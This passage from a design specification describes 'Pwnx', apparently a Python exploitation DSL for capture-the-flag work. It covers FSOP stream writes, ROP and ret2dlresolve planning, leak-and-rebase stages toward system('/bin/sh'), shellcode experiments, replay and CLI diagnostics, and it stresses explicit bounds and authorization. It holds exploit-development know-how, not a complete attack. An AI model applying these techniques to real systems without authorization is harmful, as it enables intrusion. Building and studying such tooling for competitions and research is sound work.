construction reuses prepared actions without consuming new IDs, while multiple
goals retain distinct operations.

The primary `pwnx.__all__` positions the fluent competition API as the default:
Challenge and constraints are exported, while Action/EffectContract/Payload and
controlled-buffer/ROP implementation types are available only from
`pwnx.advanced` or backend namespaces.

### 16.7 Stream Effects and FILE Layouts

FSOP is modeled as a requested stream effect against an explicit libc layout:

~~~python
from pwnx import FSOPContext, FSOPProvider, StreamCapability, glibc_file_layout

proof = FSOPProvider(glibc_file_layout("2.35")).prove(
    StreamCapability("read environ", "leak-range", target=environ, size=8),
    arbitrary_write=arbitrary_write,
    context=FSOPContext(file_storage, lock, validated_vtable),
)
~~~

The result contains labelled writes and a technique proof. Leak and write goals
produce the FILE-object write. Controlled-call goals additionally produce the
wide-data and fake-wide-vtable writes containing the selected call target.
The supplied primitive must explicitly write process memory; read-only or
unrelated capabilities, unsupported layouts, missing storage, and
wide-vtable-validation assumptions fail during proof construction rather than
during target I/O.

### 16.8 Bounded Investigation

Investigation produces candidate evidence, not exploit truth:

~~~python
from pwnx import (
    CrashTriageAdapter,
    Investigation,
    InvestigationAdapterRegistry,
    InvestigationBudget,
    InvestigationRequest,
)

triage = Investigation(
    InvestigationRequest(
        "crash-triage",
        "./core",
        budget=InvestigationBudget(timeout=15, max_results=16),
    ),
    InvestigationAdapterRegistry((CrashTriageAdapter(),)),
)
~~~

Static and crash triage are built in. Optional external analyzers use a bounded
subprocess JSON contract. Every report retains hypotheses, rejected adapters,
artifacts, resource metrics, and next validation requirements; no hypothesis is
silently promoted to a fact.

### 16.9 Platform and Service Effects

Platform differences remain adapters over the same target/action contracts:

- `ADBRecipe` materializes a device process and produces bounded shell,
  transfer, forwarding, and log actions.
- `WindowsProcessRecipe` materializes native or Wine execution; `CDBRecipe`
  adds a structured debugger script.
- `parse_pe` produces immutable import, section, mitigation, and identity
  evidence.
- `KernelVMRecipe` materializes a QEMU system target with hashed kernel,
  initrd, disk, and emulator artifacts. Its GDB listener defaults to
  `127.0.0.1`; a non-loopback `gdb_host` requires the explicit
  `unsafe_remote_gdb=True` acknowledgement.
- `TargetABI` provides versioned call/syscall layouts, constants, and binary
  schemas without ambient architecture state.

External services are explicit effects. `AcquireWebArtifact` requires a
content digest and bounded TLS/origin/redirect/cache policy. Shell-only upload
uses bounded commands plus remote size and digest verification. Competition
submission requires explicit authorization and an idempotency key. Credential
values never enter recipes or traces; only credential references do.

### 16.10 Raw-Code Experiment

`ShellcodeExperiment` is the purpose-native answer to testing raw shellcode. It
requires explicit authorization, a matching backend/architecture, and bounds
for code size, deadline, memory, output, and memory-map evidence. The result
contains the payload hash, exit code or signal, stdout/stderr, maps, duration,
and containment evidence.

The reference Linux backend uses a resource-limited subprocess and always
terminates its process group. It is explicitly a containment aid, not a trust
boundary for hostile native code. Replay reuses the recorded portable result
and never executes the shellcode again.

## 17. Execution and Evidence

A live run creates an append-only event ledger containing:

- Artifact hashes.
- Target profile.
- Lifecycle declarations.
- Technique and backend versions.
- Selected plan.
- Raw sent and received frames.
- Stream ranges consumed by matchers.
- Parsed facts.
- Derived expressions.
- Assumptions and validations.
- Payload layouts.
- Restarts and reconnects.
- Opaque-action inputs and outputs.

~~~python
run = plans.run(profile="remote")

run.fact(c.libc.base)
run.payload("stage2").layout()
run.explain(c.libc.system)
~~~

The strongest invariant is:

> Every generated payload byte can be traced to a declaration, observation,
> artifact fact, technique decision, or explicit opaque boundary.

## 18. Replay

Replay re-executes parsing, derivation, validation, and payload compilation
against recorded events.

~~~text
Same generated send:
  consume the recorded response

Changed parser:
  recompute derived facts and payloads

Changed generated send:
  stop at the first divergence

Opaque action:
  reuse its result only when identity and inputs match
~~~

Example:

~~~text
Replay divergence at action 8

Recorded send:
  31 0a

Current send:
  32 0a

Remote observations after action 8 are no longer valid.
Start a fresh live attempt to continue.
~~~

Pwnx never implies that remote state was replayed or rolled back.

## 19. Diagnostics

### 19.1 Missing Capability

~~~text
Cannot construct system("/bin/sh")

Required:
  libc base
  pointer to "/bin/sh\0"
  callable system
  control-flow transfer

Available:
  RIP control at offset 72
  executable symbols

Missing:
  a fact or recipe that relocates libc

Possible declarations:
  observe a libc symbol
  learn a libc symbol through a leak recipe
  select ret2dlresolve instead
~~~

### 19.2 Invalid Payload

~~~text
PayloadConstraintError

The line input forbids byte 0x0a.
The byte occurs at payload offset 83.

Origin:
  libc.system
    <- libc relocation
    <- puts observation
    <- startup bytes 12..25
~~~

### 19.3 Stale Value

~~~text
StaleValueError

heap.base belongs to process remote#4.
The current payload targets process remote#5.

remote#4 ended when its connection closed.
Acquire a heap observation in the current process.
~~~

## 20. Command-Line Interface

~~~bash
pwnx plan solve.py
pwnx run solve.py
pwnx run solve.py --profile remote
pwnx run solve.py --debug break=main

pwnx explain runs/17 libc.system
pwnx explain runs/17 payload:stage2@88
pwnx trace runs/17
pwnx diff runs/16 runs/17
pwnx replay solve.py runs/17
~~~

plan must be useful before execution:

~~~text
Goal: system("/bin/sh")

Stage 1
  wait for "payload: "
  call write(1, puts@got, 8)
  return to main

Stage 2
  parse 8-byte puts pointer
  rebase supplied libc
  locate "/bin/sh"
  satisfy System V stack alignment
  call system

Unverified assumptions
  remote libc matches ./libc.so.6
  stdout file descriptor is 1
~~~

## 21. Non-Goals

Pwnx 0.5 does not promise:

- Unbounded or autonomous vulnerability discovery.
- Arbitrary exploit synthesis.
- Proof of remote libc identity from one plausible pointer.
- Transactional heap rollback.
- Replay after changed outbound effects.
- Automatic race reproducibility.
- Silent reuse of runtime addresses after reconnect.
- Support for every architecture or libc layout.
- Optimization through opaque callbacks.
- Hidden AI-selected exploit strategies.

Discovery-like work is available only as a separate bounded investigation:

~~~python
Investigation(
    InvestigationRequest(
        "symbolic",
        "./chall",
        budget=InvestigationBudget(timeout=300, max_states=100_000),
    )
)
~~~

It returns hypotheses and remains distinct from `want()`.

## 22. MVP Scope

Pwnx 0.1 should support:

- A Python 3 embedded DSL.
- AMD64 ELF targets.
- Local, remote, debug, and replay profiles.
- Immutable artifact offsets and scoped runtime addresses.
- Line and raw channels.
- Startup observations and explicit action-bound observations.
- Symmetric codecs.
- observe(), control(), learn(), and want().
- Return-address control.
- ROP calls.
- Leak, rebase, and second-stage planning.
- SROP frame construction and a ret2dlresolve technique plugin.
- Format-string reads and writes.
- Ordered sequences.
- Custom recipes.
- Opaque actions.
- Deterministic plan selection.
- Plan, explain, run, trace, diff, and replay.

Version 0.5 additionally exposes through the shared semantic kernel:

- Versioned allocator-state and heap capability proofs.
- Versioned FILE-layout and stream-capability proofs.
- Bounded search and explicit race actions.
- Bounded static, crash, and external investigation adapters.
- Broader architecture support.
- Android, Windows/PE/CDB, and kernel-VM environment adapters.
- Versioned ABI constants, call/syscall layouts, and binary schemas.
- Verified web acquisition, shell-only transfer, and authorized competition
  submission actions.
- Symmetric checksum, compression, integrity, and authentication pipelines.
- Bounded replay-safe shellcode experiments.

Future releases may add:

- Additional allocator and libc layout models.
- Additional architecture-specific technique compilers.
- Distributed or multi-target plans.

## 23. Acceptance Criteria

The design is successful when:

1. Ret2win takes three declarations.
2. Leak, rebase, and call contains no manual I/O or base arithmetic.
3. Declaration order does not affect the plan.
4. Stateful recipes remain explicitly ordered.
5. A custom recipe appears completely in plan().
6. An opaque action weakens guarantees only around itself.
7. A local address cannot enter a remote payload.
8. Channel constraints reject invalid payloads before sending.
9. Multiple tactics produce stable, explainable rankings.
10. Changed parsing can be replayed offline.
11. Changed outbound bytes stop replay.
12. Every generated byte has an explanation path.
13. Every external service or platform effect has explicit bounds, identity,
    authorization where irreversible, and a non-repeating replay result.
14. A transform pipeline builds and parses symmetrically and rejects oversized
    or unauthenticated data before it becomes a fact.
15. Unsupported host, architecture, ABI, debugger, emulator, or device
    combinations produce evidence instead of implicit fallback.
16. A target-bearing trace requires the matching target recipe even when replay
    is invoked directly through `Plan.run`.
17. Observation is an ordinary bounded Action whose stream/cursor effects and
    produced facts are visible before execution.

The principal architectural risk is hidden work: runtime callbacks that create
actions, observations with unclear byte sources, silently changing tactic
selection, and incorrect state invalidation.

A single typed fact-and-effect IR prevents that. Ordinary users still see:

~~~python
c.observe(...)
c.control(...)
c.learn(...)
c.want(...)
c.run()
~~~

That is the intended balance: a tiny Python language for expressing exploits,
backed by a rigorous compiler for realizing them.

## 24. Research Basis

This specification was informed by current upstream documentation retrieved on
2026-11-06.

### Declarative Graphs and Planning

- Pulumi Inputs and Outputs:
  https://www.pulumi.com/docs/iac/concepts/inputs-outputs/
  - Symbolic outputs retain dependency information before values exist.
  - Pwnx adopts dependency-carrying facts without adopting deferred callbacks
    for action construction.

- Pulumi apply:
  https://www.pulumi.com/docs/iac/concepts/inputs-outputs/apply/
  - Pulumi warns that creating resources inside apply can hide work from
    preview.
  - Pwnx forbids pure fact transformations from creating target actions.

- Terraform dependency graph:
  https://developer.hashicorp.com/terraform/internals/graph
  - References create graph edges and graph traversal waits for prerequisites.
  - Pwnx applies this to facts and capabilities.

- Bazel extension model:
  https://bazel.build/extending/concepts
  - Loading and analysis are separated from action execution.
  - Pwnx separates declaration, planning, lowering, and execution.

### Embedded Python Expressions and Binary Codecs

- SQLAlchemy expression constructs:
  https://docs.sqlalchemy.org/en/20/core/foundation.html
  - Python expressions construct typed objects that are compiled later.
  - Pwnx uses symbolic expression objects rather than immediate integers and
    bytes.

- SQLAlchemy compiler extensions:
  https://docs.sqlalchemy.org/en/20/core/compiler.html
  - Custom expression nodes extend compilation without replacing the core.
  - Pwnx techniques follow the same extension principle.

- Construct:
  https://construct.readthedocs.io/en/latest/intro.html
  - Declarative schemas can parse and build binary representations.
  - Pwnx codecs use parse/build/validate/explain symmetry.

- Z3Py:
  https://z3prover.github.io/api/html/classz3py_1_1_expr_ref.html
  - Symbolic operations build typed expression trees.
  - Pwnx symbolic values retain type, dependencies, and provenance.

### Replay

- Temporal workflow determinism:
  https://docs.temporal.io/workflow-definition
  - Replay is valid only while generated commands match recorded history.
  - Pwnx replay stops at the first changed outbound effect.

### Exploitation Backends and Boundaries

- Pwntools ROP:
  https://docs.pwntools.com/en/stable/rop/rop.html
  - ROP.call and register-setting already synthesize chains from stated goals.

- Pwntools ret2dlresolve:
  https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html
  - Relocation payload construction can be automated once staging primitives
    are supplied.

- Pwntools format strings:
  https://docs.pwntools.com/en/stable/fmtstr.html
  - Format-string payload generation already accepts writes and constraints.

- Angrop API:
  https://github.com/angr/angrop/blob/master/docs/pythonapi.md
  - Angrop can synthesize register, call, syscall, pivot, memory-write, and SROP
    chains after the desired effect is stated.

These tools establish a realistic boundary: chain and payload synthesis can be
automated after the author supplies the primitive, facts, and intended effect.
Pwnx's distinctive layer is declarative composition across those facts,
capabilities, stages, constraints, and target interactions.
